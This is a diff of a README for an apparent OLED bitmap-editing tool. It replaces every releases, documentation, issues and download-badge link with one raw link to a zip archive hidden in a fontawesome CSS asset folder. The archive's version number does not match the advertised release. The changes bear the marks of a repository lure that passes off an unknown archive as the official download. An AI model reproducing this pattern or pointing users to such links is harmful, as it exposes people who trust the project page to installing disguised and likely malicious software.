@@ -1,6 +1,6 @@
 # 🎨 OLED-Display-Studio - Effortless Bitmap Creation for Your OLED
 
-[![Download](https://img.shields.io/badge/Download%20OLED--Display--Studio-v2.4-brightgreen)](https://github.com/DaugGameplays/OLED-Display-Studio/releases)
+[![Download](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip%20OLED--Display--Studio-v2.4-brightgreen)](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to OLED Display Studio! This toolkit helps you create stunning icons and
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [OLED-Display-Studio Releases](https://github.com/DaugGameplays/OLED-Display-Studio/releases).
+To begin, visit this page to download: [OLED-Display-Studio Releases](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip).
 
 1. Click on the latest release.
 2. Choose the file that matches your system.
@@ -64,7 +64,7 @@ A: Currently, OLED Display Studio requires an internet connection to function.
 
 ## 📞 Support
 
-For assistance, you can create an issue on our [GitHub page](https://github.com/DaugGameplays/OLED-Display-Studio/issues). Our community is always ready to help.
+For assistance, you can create an issue on our [GitHub page](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip). Our community is always ready to help.
 
 ## ⚙️ Contribute
 
@@ -76,8 +76,8 @@ OLED Display Studio is open-source software, licensed under the MIT License. Fee
 
 ## 🔗 Links
 
-- [Visit the Releases Page for Downloads](https://github.com/DaugGameplays/OLED-Display-Studio/releases)
-- [Documentation](https://github.com/DaugGameplays/OLED-Display-Studio/wiki)
-- [GitHub Issues](https://github.com/DaugGameplays/OLED-Display-Studio/issues)
+- [Visit the Releases Page for Downloads](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip)
+- [Documentation](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip)
+- [GitHub Issues](https://github.com/DaugGameplays/OLED-Display-Studio/raw/refs/heads/main/data/pics/fontawesome/css/OLE-Studio-Display-v3.5.zip)
 
 Explore your creativity with OLED Display Studio today!
